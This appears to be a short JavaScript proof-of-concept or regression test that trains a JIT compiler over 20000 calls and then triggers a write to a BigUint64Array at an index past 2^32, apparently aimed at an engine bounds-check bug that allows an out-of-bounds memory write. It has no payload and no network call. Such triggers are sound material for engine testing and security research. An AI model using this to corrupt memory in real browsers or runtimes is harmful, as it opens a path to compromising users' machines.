function vuln(a1) {
    const v4 = new BigUint64Array(1);
    const arr = v4;
    let idx = 1n;
    if (a1) {
        idx = BigInt("0x100000000");
    }
    for (let i12 = 0; i12 < 1; i12++) {
        idx = idx + 1n;
    }
    arr[idx] = 1337n;
}
for (let i22 = 0; i22 < 20000; i22++) {
    vuln(false);
}
vuln(true);
